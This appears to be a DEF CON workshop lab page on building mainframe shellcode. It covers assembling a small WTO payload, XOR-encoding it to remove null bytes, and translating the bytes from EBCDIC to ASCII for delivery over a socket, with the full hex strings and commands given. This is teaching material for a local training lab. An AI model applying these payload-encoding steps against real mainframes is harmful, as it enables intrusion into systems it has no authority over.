created: 20220804203418702
modified: 20220804223726181
tags: 
title: Lab 14 - Sockets and EBCDIC
type: text/vnd.tiddlywiki

Up till now we've had to manually look up the ASCII -> EBCDIC for our memory locations. Well, we'll have the exact same problem with our shell code. Here's the shell code:

```
         USING *,R14
         DS    XL6
COPY     LA    R1,MSGWTO
         SVC   35
         SVC   03
MSGWTO   DC    XL4'00070000'
         DC    C'WTO'
```

!! Creating the shell code

# Logon on to the local mainframe (either `x3270 -noverifycert L:localhost:2323` or https://localhost:8443)
# Logon with DC00: `LOGON DC00/DC00`
# Using ISPF submit the job LAB13 from `DC00.JCLLIB`:
#* `=3.4` option/command bar
#* put `DC00.JCLLIB` in `Data set name prefix ==>`
#* Put an `E` in front of `DC00.JCLLIB`
#* Put an `E` in front of `LAB13`
#* On the command bar type `SUBMIT`

!! Download the shell code

# Restart the FTP server: on the Command line in http://localhost:8888 (Username/password: `defcon`) type `/start ftpddc30,srvport=2126` 
# FTP and donwload the output: 
## `ftp localhost 2126` 
## `cd DC00.LOAD`
## `bin`
## `GET WTOSML`

!! Get the Bytes

# Open WTOSML with your hex editor, and copy the bytes between `CAFEBABE` with Right click -> Copy as -> Value: `41 10 E0 0E 0A 23 0A 03 00 07 00 00 E6 E3 D6`. 
# We now have the shell code we're going to use, except the Null bytes (`00`) are a big problem, we can't do that we need to convert them. There's also other troublesome bytes in here. 
# What if we had some bytes that we XOR'd our shell code with? Well, lucky for you we do `9999999999D499D499D4999999999916`
# Using cyberchef, we XOR the bytes and get: `D889799793F793D799D399997F7A4F16` ([[Link to the recipe if you're interested|https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'9999999999D499D499D4999999999916'%7D,'Standard',false)To_Hex('None',0)To_Upper_case('All')&input=NDExMEUwMEUwQTIzMEEwMzAwMDcwMDAwRTZFM0Q2MDA]])
# ''Problem'' We've XOR'd our shell code, but we need a way to un XOR it on the mainframe. Luckily Jake wrote the assembly to do just that. 
# Open the file `DC00.JCLLIB(LAB14)` (just like we did above)
# Replace `<THE XORED BYTES>` with `D889799793F793D799D399997F7A4F16`
# On the command bar type `SUBMIT` to submit the job

!! Download The Final Form

Our shell code is ready and waiting in `DC00.LOAD(WTOSMLX)`.

# Download the shell code with FTP (and described above): `GET WTOSMLX`
# Open this file with your hex editor `okteta WTOSMLX`
# Notice our shell code is between `CAFEBABE`: `D7 0F E0 06 E0 16 D8 89 79 97 93 F7 93 D7 99 D3 99 99 7F 7A 4F 16 99 99 99 99 99 D4 99 D4 99 D4 99 99 99 99 99 16`
#* This is what we need it to look like after it gets translated by from ASCII to EBCDIC by the socket, so we need to convert each byte to ASCII first. 
# Lucky for you we have a included a python script in the workshop VM: `python3 ~/labs/e2alookup.py D7 0F E0 06 E0 16 D8 89 79 97 93 F7 93 D7 99 D3 99 99 7F 7A 4F 16 99 99 99 99 99 D4 99 D4 99 D4 99 99 99 99 99 16`: 

```
D7 --> 50
0F --> 0F
E0 --> 5C
06 --> 86
E0 --> 5C
16 --> 08
D8 --> 51
89 --> 69
79 --> 60
97 --> 70
93 --> 6C
F7 --> 37
93 --> 6C
D7 --> 50
99 --> 72
D3 --> 4C
99 --> 72
99 --> 72
7F --> 22
7A --> 3A
4F --> 7C
16 --> 08
99 --> 72
99 --> 72
99 --> 72
99 --> 72
99 --> 72
D4 --> 4D
99 --> 72
D4 --> 4D
99 --> 72
D4 --> 4D
99 --> 72
99 --> 72
99 --> 72
99 --> 72
99 --> 72
16 --> 08
Final String: 500F5C865C08516960706C376C50724C7272223A7C0872727272724D724D724D727272727208
Writting bytes to shellcode.bin
```




